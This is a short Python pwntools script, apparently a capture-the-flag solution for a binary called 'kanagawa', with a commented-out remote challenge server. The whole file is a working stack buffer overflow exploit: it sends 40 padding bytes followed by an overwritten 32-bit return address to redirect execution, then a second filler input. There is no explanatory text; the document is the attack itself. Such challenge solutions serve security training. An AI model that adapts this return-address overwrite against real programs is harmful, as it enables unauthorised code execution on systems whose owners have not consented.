#!/usr/bin/python
import pwn

payload = b"A"*40 + pwn.pack(0x0804851b, 32) + b"\n"
payload2 = b"AAAAAAAAAAAAAAAAAAA\n"
p = pwn.process("./kanagawa")
#p = pwn.remote("challs.dvc.tf", 4444)
p.send(payload)
print(p.recv())
p.send(payload2)
print(p.recv())
